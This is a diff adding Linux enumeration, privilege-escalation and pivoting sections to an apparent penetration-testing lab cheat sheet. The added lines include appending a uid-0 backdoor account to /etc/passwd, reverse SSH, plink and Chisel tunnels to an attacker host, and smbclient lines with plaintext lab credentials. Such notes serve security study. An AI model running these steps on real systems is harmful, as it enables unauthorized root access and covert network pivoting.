@@ -40,11 +40,21 @@
   - [Windows](#windows-3)
     - [PowerView](#powerview)
     - [winPEAS](#winpeas)
+  - [Linux](#linux-1)
+    - [cmd](#cmd)
+    - [linpeas](#linpeas)
 - [Privilege Escalation](#privilege-escalation)
   - [Windows](#windows-4)
     - [PowerUp](#powerup)
     - [LOLBIN](#lolbin)
     - [token](#token)
+  - [Linux](#linux-2)
+    - [SUGGEST](#suggest)
+    - [/etc/passwd](#etcpasswd)
+- [Transfer](#transfer)
+  - [Port Forwading](#port-forwading)
+    - [SSH](#ssh)
+    - [Chisel](#chisel)
 - [Tips](#tips)
 
 
@@ -290,6 +300,7 @@ Set-ExecutionPolicy -ExecutionPolicy Unrestricted
 # SMB
 impacket-smbclient intelligence.htb/Tiffany.Molina:NewIntelligenceCorpUser9876@10.10.10.248
 smbclient -U tyler \\\\test\\share
+smbclient -p 4455 //192.168.50.63/scripts -U hr_admin --password=Welcome1234
 
 # psexec
 impacket-psexec active.htb/Administrator:Ticketmaster1968@10.10.10.100
@@ -353,6 +364,18 @@ iwr -Uri http:// -Outfile winPEASany.exe
 iwr -Uri http:// -Outfile winPEAS.bat
 ```
 
+## Linux
+### cmd
+```bash
+ss -anp
+find / -writable -type d 2>/dev/null
+find / -iname "*admin*" 2>/dev/null
+```
+### linpeas
+```bash
+cd /usr/share/peass/linpeas
+```
+
 # Privilege Escalation
 ## Windows
 ### PowerUp
@@ -404,6 +427,48 @@ cd /usr/share/windows-resources/binaries/
 .\SharpToken.exe add_user admin Abcd1234! Administrators
 ```
 
+## Linux
+### SUGGEST
+```bash
+wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh 
+```
+###  /etc/passwd
+```bash
+joe@debian-privesc:~$ openssl passwd w00t
+Fdzt.eqJQ4s0g
+joe@debian-privesc:~$ echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
+```
+
+# Transfer
+## Port Forwading
+### SSH
+```bash
+# localport
+ssh -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
+# l Dinamic
+## proxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
+ssh -D 0.0.0.0:9999 database_admin@10.4.50.215
+tail /etc/proxychains4.conf
+
+# remote
+ssh -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
+# r Dinamic
+ssh -R 9998 kali@192.168.118.4
+tail /etc/proxychains4.conf
+```
+#### sshuttle
+```bash
+sshuttle -r database_admin@192.168.50.63:22 10.4.50.0/24 172.16.50.0/24
+```
+#### plink
+```bash
+C:\Windows\Temp\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4
+```
+### Chisel
+```bash
+./chisel_1.7.5_linux_amd64 server -p 2345 --reverse
+chisel.exe client 192.168.45.157:2345 R:80:172.16.118.241:80
+```
 
 
 # Tips
